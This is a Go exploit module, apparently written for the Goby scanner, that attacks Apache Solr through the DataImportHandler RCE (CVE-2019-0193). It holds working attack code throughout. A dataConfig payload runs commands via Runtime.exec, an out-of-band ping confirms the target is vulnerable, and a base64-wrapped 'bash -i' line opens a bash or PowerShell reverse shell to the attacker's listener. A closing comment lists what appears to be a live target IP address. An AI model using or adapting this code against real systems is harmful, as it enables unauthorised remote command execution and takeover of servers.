package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache Solr RCE (CVE-2019-0193)",
    "Description": "In Apache Solr, the DataImportHandler, an optional but popular module to pull in data from databases and other sources, has a feature in which the whole DIH configuration can come from a request's \"dataConfig\" parameter. The debug mode of the DIH admin screen uses this to allow convenient debugging / development of a DIH config. Since a DIH config can contain scripts, this parameter is a security risk. Starting with version 8.2.0 of Solr, use of this parameter requires setting the Java System property \"enable.dih.dataConfigParam\" to true.",
    "Product": "Apache Solr",
    "Homepage": "https://solr.apache.org/",
    "DisclosureDate": "2021-05-31",
    "Author": "李大壮",
    "FofaQuery": "app=\"Solr\"",
    "GobyQuery": "app=\"Solr\"",
    "Level": "3",
    "Impact": "<p>When the Web backend processes the request, it uses a \"ScriptTransformer\" to parse the \"script\" without any restrictions on the content of the script ( Any Java class can be imported and used, such as a class that executes a command), so that any code can be executed</p>",
    "Recommendation": "",
    "References": [
        "https://issues.apache.org/jira/browse/SOLR-13669",
        "https://lists.apache.org/thread.html/1addbb49a1fc0947fb32ca663d76d93cfaade35a4848a76d4b4ded9c@%3Cissues.lucene.apache.org%3E",
        "https://lists.apache.org/thread.html/42cc4d334ba33905b872a0aa00d6a481391951c8b1450f01b077ce74@%3Cissues.lucene.apache.org%3E",
        "https://lists.apache.org/thread.html/55880d48e38ba9e8c41a3b9e41051dbfdef63b86b0cfeb32967edf03@%3Cissues.lucene.apache.org%3E",
        "https://lists.apache.org/thread.html/6f2d61bd8732224c5fd3bdd84798f8e01e4542d3ee2f527a52a81b83@%3Cissues.lucene.apache.org%3E",
        "https://lists.apache.org/thread.html/7143983363f0ba463475be4a8b775077070a08dbf075449b7beb51ee@%3Cissues.lucene.apache.org%3E",
        "https://lists.apache.org/thread.html/9b0e7a7e3e18d0724f511403b364fc082ff56e3134d84cfece1c82fc@%3Cissues.lucene.apache.org%3E",
        "https://lists.apache.org/thread.html/a6e3c09dba52b86d3a1273f82425973e1b0623c415d0e4f121d89eab@%3Cissues.lucene.apache.org%3E",
        "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3@%3Ccommits.nifi.apache.org%3E",
        "https://lists.apache.org/thread.html/e85f735fad06a0fb46e74b7e6e9ce7ded20b59637cd9f993310f814d@%3Cissues.lucene.apache.org%3E",
        "https://lists.apache.org/thread.html/r19d23e8640236a3058b4d6c23e5cd663fde182255f5a9d63e0606a66@%3Cdev.lucene.apache.org%3E",
        "https://lists.apache.org/thread.html/r1d4a247329a8478073163567bbc8c8cb6b49c6bfc2bf58153a857af1@%3Ccommits.druid.apache.org%3E",
        "https://lists.apache.org/thread.html/r339865b276614661770c909be1dd7e862232e3ef0af98bfd85686b51@%3Cdev.lucene.apache.org%3E",
        "https://lists.apache.org/thread.html/r33aed7ad4ee9833c4190a44e2b106efd2deb19504b85e012175540f6@%3Cissues.lucene.apache.org%3E",
        "https://lists.apache.org/thread.html/rb34d820c21f1708c351f9035d6bc7daf80bfb6ef99b34f7af1d2f699@%3Cissues.lucene.apache.org%3E",
        "https://lists.apache.org/thread.html/rc400db37710ee79378b6c52de3640493ff538c2beb41cefdbbdf2ab8@%3Ccommits.submarine.apache.org%3E",
        "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b@%3Ccommits.nifi.apache.org%3E",
        "https://lists.debian.org/debian-lts-announce/2019/10/msg00013.html",
        "https://lists.debian.org/debian-lts-announce/2020/08/msg00025.html",
        "https://nvd.nist.gov/vuln/detail/CVE-2019-0193",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0193"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "Name": "AttackType",
            "Type": "select",
            "Value": "goby_shell"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "rce"
    ],
    "CVEIDs": [
        "CVE-2019-0193"
    ],
    "CVSSScore": "7.2",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": [
            "Solr"
        ],
        "System": null,
        "Hardware": null
    },
    "Recommandation": "<p>Update Patches<br></p>",
    "PocId": "10249"
}`

	coreUri := "/solr/admin/cores?indexInfo=false&wt=json"

	getCore := func(u *httpclient.FixUrl) (string, string) {
		resp, _ := httpclient.SimpleGet(u.FixedHostInfo + coreUri)
		core := regexp.MustCompile(`"name":"(.*?)",`).FindStringSubmatch(resp.RawBody)
		paths := regexp.MustCompile(`"instanceDir":"(.*?)",`).FindStringSubmatch(resp.RawBody)
		osType := "lin"

		if len(core) == 0 {
			return "", ""
		}

		if strings.Contains(paths[1], ":") {
			osType = "win"
		}

		return core[1], osType
	}
	postData := func(u *httpclient.FixUrl, core, cmd string) {
		cfg := httpclient.NewPostRequestConfig("/solr/" + core + "/dataimport")
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
		cfg.Header.Store("Referer", u.FixedHostInfo+"/solr/")
		cfg.VerifyTls = false
		cfg.Data = fmt.Sprintf("command=full-import&verbose=false&clean=true&commit=true&debug=true&core=atom&dataConfig=%%3CdataConfig%%3E%%0A++%%3CdataSource+type%%3D%%22URLDataSource%%22%%2F%%3E%%0A++%%3Cscript%%3E%%3C!%%5BCDATA%%5B%%0A++++++++++function+poc()%%7B+java.lang.Runtime.getRuntime().exec(%%22%s%%22)%%3B%%0A++++++++++%%7D%%0A++%%5D%%5D%%3E%%3C%%2Fscript%%3E%%0A++%%3Cdocument%%3E%%0A++++%%3Centity+name%%3D%%22stackoverflow%%22%%0A++++++++++++url%%3D%%22https%%3A%%2F%%2Fstackoverflow.com%%2Ffeeds%%2Ftag%%2Fsolr%%22%%0A++++++++++++processor%%3D%%22XPathEntityProcessor%%22%%0A++++++++++++forEach%%3D%%22%%2Ffeed%%22%%0A++++++++++++transformer%%3D%%22script%%3Apoc%%22+%%2F%%3E%%0A++%%3C%%2Fdocument%%3E%%0A%%3C%%2FdataConfig%%3E&name=dataimport", cmd)
		httpclient.DoHttpRequest(u, cfg)
	}
	bashBase64 := func(cmd string) string {
		cmdBase64 := base64.StdEncoding.EncodeToString([]byte(cmd))
		return `bash -c {echo,` + cmdBase64 + `}|{base64,-d}|{bash,-i}`
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			randomHex := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(randomHex)
			solrCore, osType := getCore(hostinfo)
			cmd := "ping+c+1+" + checkUrl
			if osType == "win" {
				cmd = "ping+n+1+" + checkUrl
			}
			if solrCore != "" {
				postData(hostinfo, solrCore, cmd)
			}
			return godclient.PullExists(randomHex, time.Second*15)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if stepLogs.Params["AttackType"].(string) == "goby_shell" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := godclient.ReverseTCPByBash(rp)
					solrCore, osType := getCore(expResult.HostInfo)
					if osType == "win" {
						cmd = godclient.ReverseTCPByPowershell(rp)
					}
					postData(expResult.HostInfo, solrCore, url.QueryEscape(bashBase64(cmd)))
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				}
			}
			return expResult
		},
	))
}

// http://217.160.182.87:8983
